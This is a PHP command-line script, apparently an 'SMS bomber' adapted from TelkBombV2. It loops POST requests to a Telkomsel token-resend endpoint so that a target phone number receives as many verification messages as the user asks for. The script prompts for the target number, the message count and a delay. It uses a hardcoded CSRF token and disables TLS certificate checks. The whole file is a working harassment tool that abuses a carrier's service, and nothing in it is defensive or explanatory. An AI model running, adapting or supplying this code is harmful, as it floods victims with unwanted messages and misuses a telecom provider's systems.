<?php
/*
    JNCK MEDIA (c) 2017
    https://github.com/dandyraka/TelkBombV2
    Made by Dandy Raka
*/
function telkbombv2($no, $jum, $wait = 0)
{
    $x      = 1;
    $result = "";
    while ($x <= $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://mobi.telkomsel.com/ulang/token");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "ci_csrf_token=daaac6aa63d46b9709f0e3d054a65c9b&msisdn=" . $no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://mobi.telkomsel.com/ulang?ch=WEB');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec($ch);
        curl_close($ch);
        $json = json_decode($server_output);
        if ($json->status == "1") {
            $result .= $x . print "\033[1;32m Berhasil di kirim ke ".$no." Sleep for ".$wait."s.. \n";
        sleep($wait);
        } else {
            $result .= print "\033[0;31m Gagal di kirim ke ".$no." Sleep for ".$wait."s.. \n";
        sleep($wait);
        }
        $x++;
    }
}

echo "\033[0;31m╔╦╗╔═╗╦  ╦╔═╔═╗╔╦╗╔═╗╔═╗╦  \n";
echo " ║ ║╣ ║  ╠╩╗║ ║║║║╚═╗║╣ ║ \n";
echo " ╩ ╚═╝╩═╝╩ ╩╚═╝╩ ╩╚═╝╚═╝╩═╝ \n";
echo "    \033[0;32m Modified by まやちゃん \n";
echo "\033[0mThanks to https://github.com/dandyraka \n";
echo "\n";
echo "Nomor Target (ex : 08xxx) : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah Pesan : ";
$jumlah = trim(fgets(STDIN));
echo "delay : ";
$wait = trim(fgets(STDIN));
$execute = telkbombv2($nomor, $jumlah, $wait);
print $execute;
?>
